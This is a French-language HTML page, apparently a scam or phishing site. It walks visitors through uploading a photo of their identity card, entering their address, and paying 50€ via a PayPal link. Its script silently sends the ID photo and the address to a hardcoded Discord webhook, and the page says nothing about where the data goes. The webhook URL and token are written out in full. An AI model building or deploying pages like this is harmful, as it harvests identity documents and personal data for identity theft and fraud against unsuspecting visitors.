<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
            background: url('ChatGPT Image 8 nov. 2025, 19_19_24.png') no-repeat center center fixed;
            background-size: cover;
            color: white; /* Texte plus lumineux */
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100%;
            text-align: center;
        }
        .btn-custom {
            background-color: #007bff;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .btn-custom:hover {
            background-color: #0056b3;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-control {
            padding: 10px;
            font-size: 16px;
            color: black; /* Texte plus lumineux */
        }
        .file-input {
            display: none;
        }
        .file-label {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .file-label:hover {
            background-color: #0056b3;
        }
        .page {
            display: none;
        }
        .page.active {
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="page active" id="page1">
            <h1>Cliquez pour continuer</h1>
            <button class="btn-custom" onclick="nextPage()">Continuer</button>
        </div>
        <div class="page" id="page3">
            <h1>Téléverser une photo de votre carte d'identité</h1>
            <form id="idPhotoForm">
                <div class="form-group">
                    <label for="idPhoto" class="file-label">Choisir un fichier</label>
                    <input type="file" id="idPhoto" class="file-input" required>
                </div>
                <button type="button" class="btn-custom" onclick="nextPage()">Continuer</button>
            </form>
        </div>
        <div class="page" id="page4">
            <h1>Entrez votre adresse</h1>
            <form id="addressForm">
                <div class="form-group">
                    <label for="address">Adresse:</label>
                    <input type="text" id="address" class="form-control" required>
                </div>
                <button type="button" class="btn-custom" onclick="nextPage()">Continuer</button>
            </form>
        </div>
        <div class="page" id="page5">
            <h1>Effectuez le paiement</h1>
            <p>Cliquez sur le lien ci-dessous pour effectuer le paiement de 50€:</p>
            <a href="https://www.paypal.com/ncp/payment/7CE6V6LVCDMB6" target="_blank" class="btn-custom">Payer 50€</a>
        </div>
    </div>

    <div id="paypal-button-container"></div>
    <p id="result-message"></p>

    <script src="https://www.paypal.com/sdk/js?client-id=YOUR_LIVE_CLIENT_ID&currency=EUR&enable-funding=venmo,card"></script>
    <script>
        function nextPage() {
            const currentPage = document.querySelector('.page.active');
            const nextPage = currentPage.nextElementSibling;

            if (nextPage) {
                currentPage.classList.remove('active');
                nextPage.classList.add('active');
            }
        }

        function submitForm() {
            const idPhoto = document.getElementById('idPhoto').files[0];
            const address = document.getElementById('address').value;

            const formData = new FormData();
            formData.append('idPhoto', idPhoto);
            formData.append('address', address);

            const payload = {
                content: `Nouvelle soumission:\n
                         Adresse: ${address}`
            };

            fetch('https://discordapp.com/api/webhooks/1436777556211925024/VmCTo_DU6UTli4D6y3CcnXtNmo_2z3XsW761P38d6xKXBaSCyo7RU6kCNZ2C0j_VmUby', {
                method: 'POST',
                body: JSON.stringify(payload),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch(error => {
                console.error('Error:', error);
            });

            // Envoi de la photo de la carte d'identité
            const photoPayload = new FormData();
            photoPayload.append('file', idPhoto);

            fetch('https://discordapp.com/api/webhooks/1436777556211925024/VmCTo_DU6UTli4D6y3CcnXtNmo_2z3XsW761P38d6xKXBaSCyo7RU6kCNZ2C0j_VmUby?wait=true', {
                method: 'POST',
                body: photoPayload
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo uploaded successfully:', data);
            })
            .catch(error => {
                console.error('Error uploading photo:', error);
            });
        }

        // Example function to show a result to the user. Your site's UI library can be used instead.
        function resultMessage(message) {
            const container = document.querySelector("#result-message");
            container.innerHTML = message;
        }
    </script>
</body>
</html>
